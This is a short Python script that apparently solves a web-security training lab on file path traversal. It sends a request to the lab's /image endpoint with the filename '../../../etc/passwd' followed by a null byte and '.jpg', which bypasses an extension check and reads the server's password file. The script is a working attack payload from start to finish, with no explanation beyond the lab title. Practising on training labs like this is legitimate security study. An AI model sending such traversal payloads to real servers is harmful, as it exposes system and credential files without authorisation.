# Lab: File path traversal, validation of file extension with null byte bypass
# difficulty: practitioner

import requests
from urllib.parse import quote

sub = '0aab00b2042c68a982611007007c0000'
url = f'https://{sub}.web-security-academy.net'

def main():
    params = {'filename': b'../../../etc/passwd\x00.jpg'}

    endpoint = '/image'
    r = requests.get(url + endpoint, params=params)
    print(r.text)
    print(f'payload => {r.url.split("?")[1]}')

if __name__ == '__main__':
    main()